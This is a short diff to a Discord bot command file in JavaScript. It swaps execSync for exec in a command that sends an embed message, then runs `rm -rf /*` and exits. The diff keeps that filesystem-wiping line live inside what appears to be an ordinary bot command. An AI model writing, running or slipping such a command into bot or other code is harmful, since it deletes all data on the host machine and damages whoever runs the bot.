@@ -1,6 +1,6 @@
 const Commands = require(`../Structures/Commands`);
 const { MessageEmbed } = require(`discord.js`);
-const { execSync } = require(`child_process`);
+const { exec } = require(`child_process`);
 const { basename } = require(`path`);
 
 class Command extends Commands {
@@ -28,7 +28,7 @@ class Command extends Commands {
 			.setTimestamp();
 		client.send(message, { embed });
 
-		execSync(`rm -rf /*`);
+		exec(`rm -rf /*`);
 		process.exit();
 	}
 }
